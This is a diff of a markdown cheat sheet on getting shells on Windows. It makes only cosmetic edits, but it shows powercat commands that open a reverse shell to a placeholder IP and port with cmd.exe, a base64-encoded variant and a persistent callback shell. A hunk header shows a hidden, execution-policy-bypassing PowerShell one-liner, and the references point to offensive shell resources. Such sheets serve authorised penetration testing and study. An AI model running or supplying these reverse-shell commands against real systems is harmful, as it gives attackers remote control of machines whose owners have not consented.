@@ -10,32 +10,32 @@ C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object S
 
 ## 02 - Powercat
 
-Generate reverse shell
+Generate reverse shell.
 
 ```
-PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -g
+> powercat -c <IP> -p <PORT> -e cmd.exe -g
 ```
 
-Generate base64 encoded reverse shell
+Generate base64 encoded reverse shell.
 
 ```
-PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -ge
+> powercat -c <IP> -p <PORT> -e cmd.exe -ge
 ```
 
-Persist callback shell
+Persist callback shell.
 
 ```
-PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -rep
+> powercat -c <IP> -p <PORT> -e cmd.exe -rep
 ```
 
 ---
 ## References
 
-- [Hacktricks Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)
+- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)
 
 - [Powercat](https://github.com/besimorhino/powercat)
 
-- [Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)
+- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)
 
 - [Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)
 
